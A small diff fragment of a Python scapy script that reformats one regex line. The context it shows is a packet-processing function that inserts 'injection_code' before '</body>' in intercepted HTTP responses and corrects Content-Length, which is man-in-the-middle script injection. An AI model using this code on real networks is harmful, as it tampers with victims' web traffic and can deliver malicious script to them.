@@ -28,7 +28,8 @@ def process_packet(packet):
             print(scapy_packet.show())
             load = str(load).replace(
                 '</body>', injection_code + '</body>')
-            content_length_search = re.search('(?:Content-Length:\s)(\d*)', load)
+            content_length_search = re.search(
+                '(?:Content-Length:\s)(\d*)', load)
             if content_length_search:
                 content_length = content_length_search.group(1)
                 new_content_length = int(content_length) + len(injection_code)
